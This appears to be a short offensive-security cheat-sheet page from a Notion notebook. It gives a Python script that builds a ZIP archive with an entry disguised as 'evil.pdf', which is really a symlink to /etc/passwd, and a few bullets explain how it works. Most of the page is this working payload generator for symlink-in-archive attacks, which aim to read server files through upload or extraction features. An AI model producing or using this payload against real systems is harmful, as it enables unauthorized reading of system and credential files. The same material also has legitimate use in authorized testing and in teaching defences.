# Preserve Symlink in ZIP file

OS: Linux
Description: Create zip file with symlink preserved
Security Domains: Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

Create a file called `mkzip.py`

```python
pico mkzip.py
```

Paste in the following snippet.

```python
import requests
import io
import zipfile
import stat

def create_zip(target_file):
    payload = io.BytesIO()
    zipInfo = zipfile.ZipInfo('evil.pdf')
    zipInfo.create_system=3
    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
    zipInfo.external_attr = unix_st_mode << 16
    zipOut = zipfile.ZipFile(payload, 'w', compression=zipfile.ZIP_DEFLATED)
    zipOut.writestr(zipInfo, target_file)
    zipOut.close()
    return payload.getvalue()

with open('newfile.zip','wb') as f:
        f.write(create_zip('/etc/passwd'))
```

### In the code above we do the following (in a nutshell!)

- Create a byte stream called ‘payload’
    - A byte stream is an area of memory that can be treated as a file.
    - We set the File Mode (unix_st_mode) so that the *symlink* properties are preserved
    - We provide the *symlink* **target_file**: `/etc/passwd`
    - We write out a zip file to disk called newfile.zip which contains our preserved symlink.